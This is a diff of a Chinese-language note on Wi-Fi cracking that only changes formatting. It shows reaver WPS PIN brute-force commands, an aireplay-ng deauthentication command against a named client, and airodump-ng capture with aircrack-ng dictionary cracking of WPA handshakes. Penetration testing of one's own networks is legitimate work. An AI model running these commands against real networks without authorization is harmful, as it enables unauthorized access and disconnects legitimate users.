@@ -14,12 +14,9 @@
 
 	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
 
-
 显示更多信息 
 
-
 	sudo reaver -i mon0 -b 40:16:9F:D8:27:A2 -S -v -n
-
 
 指定特定的pin码
 
@@ -85,17 +82,15 @@ mon0为之前已经载入并激活监听模式的无线网卡。如下图8所示
 
 	aircrack-ng  -w <字典文件> *.cap 
 
-
 强制断开
+
 	aireplay-ng -0 1  -a 6C:E8:73:50:85:F0 -c 00:1B:77:BE:19:FC mon0
 
 
 # 暴力wap的
 
-```bash
-airodump-ng -c 6  -w [filename] mon0
-```
+	airodump-ng -c 6  -w [filename] mon0
 
-```bash
-aircrack-ng  -w [字典] *.cap 
-```
+或者
+
+	aircrack-ng  -w [字典] *.cap 
